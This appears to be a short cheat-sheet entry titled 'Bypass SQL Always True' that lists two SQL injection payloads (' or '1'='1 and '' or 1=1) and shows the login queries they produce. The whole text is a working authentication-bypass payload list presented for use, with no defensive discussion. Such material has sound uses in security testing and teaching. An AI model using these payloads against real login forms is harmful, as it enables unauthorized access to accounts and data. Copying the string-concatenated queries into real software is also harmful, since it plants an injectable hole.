## Bypass SQL Always True

```php
// payload
' or '1'='1

// example query
"SELECT * FROM user WHERE username = '' or '1'='1' AND password = '' or '1'='1'" 
```

```php
// payload
'' or 1=1

// example query
"SELECT * FROM user WHERE username = '' or 1=1 AND password = '' or 1=1" 
```
